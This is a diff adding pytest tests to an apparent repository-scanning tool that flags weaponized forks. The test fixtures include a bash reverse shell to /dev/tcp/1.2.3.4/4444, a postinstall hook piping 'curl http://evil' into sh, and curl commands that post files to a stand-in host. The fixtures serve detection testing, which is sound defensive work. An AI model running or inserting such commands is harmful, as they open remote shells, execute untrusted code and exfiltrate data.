@@ -136,3 +136,33 @@ def test_scan_candidate_removes_dest_after_scan(tmp_path):
     result = scan_candidate("o/r", tmp_path, clone=clone_capture)
     assert result is not None
     assert not captured["dest"].exists()  # force-removed on success, no accumulation
+
+
+def test_lineage_confirm_categories_ignore_tool_own_code(tmp_path):
+    from git_warden.scanning.tier2 import WEAPONIZATION_CATEGORIES
+    # A red-team tool's OWN reverse shell must NOT confirm under lineage rules.
+    (tmp_path / "agent.sh").write_text(
+        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8"
+    )
+    res = analyze_repo(tmp_path, "evil/sliver-fork", confirm_categories=WEAPONIZATION_CATEGORIES)
+    assert not res.confirmed  # reverse_shell is not a weaponization category
+
+
+def test_lineage_confirm_on_added_install_hook(tmp_path):
+    import json as _j
+
+    from git_warden.scanning.tier2 import WEAPONIZATION_CATEGORIES
+    # A weaponized fork that ADDED a malicious install hook DOES confirm.
+    (tmp_path / "package.json").write_text(
+        _j.dumps({"scripts": {"postinstall": "curl http://evil|sh"}}), encoding="utf-8"
+    )
+    res = analyze_repo(tmp_path, "evil/sliver-weaponized",
+                       confirm_categories=WEAPONIZATION_CATEGORIES)
+    assert res.confirmed
+
+
+def test_restrict_paths_limits_findings(tmp_path):
+    (tmp_path / "tool.sh").write_text("curl -d @x http://evil\n", encoding="utf-8")
+    (tmp_path / "added.sh").write_text("curl -d @y http://evil\n", encoding="utf-8")
+    res = analyze_repo(tmp_path, "o/r", restrict_paths={"added.sh"})
+    assert {f.file for f in res.bash_findings} == {"added.sh"}
